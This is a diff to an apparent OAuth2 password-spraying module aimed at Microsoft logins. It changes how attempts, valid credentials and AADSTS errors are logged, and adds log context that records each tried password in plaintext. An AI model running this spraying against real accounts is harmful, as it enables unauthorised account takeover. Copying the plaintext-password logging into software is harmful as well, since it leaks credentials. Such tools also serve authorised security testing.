@@ -38,7 +38,8 @@ class SprayModule_oauth2(SprayerBase):
                 raise ValueError("Locked account limit reached.")
 
             # Grab prebuilt office headers
-            headers = Defaults.HTTP_HEADERS
+            # Updated: copy headers to avoid cross-request mutation.
+            headers = Defaults.HTTP_HEADERS.copy()
             headers["Accept"] = "application/json"
             headers["Content-Type"] = "application/x-www-form-urlencoded"
 
@@ -84,6 +85,14 @@ class SprayModule_oauth2(SprayerBase):
                 timeout=self.timeout,
                 sleep=self.sleep,
                 jitter=self.jitter,
+                # Updated: include request context for per-request logging.
+                log_context={
+                    "module": self.module_tag,
+                    "action": "spray",
+                    "target": email,
+                    "username": user,
+                    "password": password,
+                },
             )
 
             status = response.status_code
@@ -91,8 +100,14 @@ class SprayModule_oauth2(SprayerBase):
                 if self.writer:
                     self.valid_writer.write(tested)
                 self.VALID_CREDENTIALS.append(tested)
-                logging.info(
-                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
+                # Updated: richer CLI output for valid responses.
+                self._log_spray_result(
+                    "VALID",
+                    email,
+                    password,
+                    status=status,
+                    reason=response.reason,
+                    detail="OAuth2 token issued",
                 )
                 # Remove valid user from being sprayed again
                 self.userlist.remove(user)
@@ -109,15 +124,26 @@ class SprayModule_oauth2(SprayerBase):
 
             else:
                 # Handle Microsoft AADSTS errors
-                body = response.json()
-                error = body["error_description"].split("\r\n")[0]
+                # Updated: tolerate non-JSON responses for robust logging.
+                try:
+                    body = response.json()
+                    error = body["error_description"].split("\r\n")[0]
+                except Exception:
+                    body = {}
+                    error = response.text
                 self._check_aadsts(
                     user,
                     email,
                     password,
                     error,
+                    status=status,
+                    reason=response.reason,
                 )
 
         except Exception as e:
-            logging.debug(e)
+            # Updated: surface request failures with context.
+            logging.warning(
+                f"[{text_colors.WARNING}REQUEST_FAILED{text_colors.ENDC}] "
+                f"{user} | module={self.module_tag} | error={type(e).__name__}: {e}"
+            )
             pass
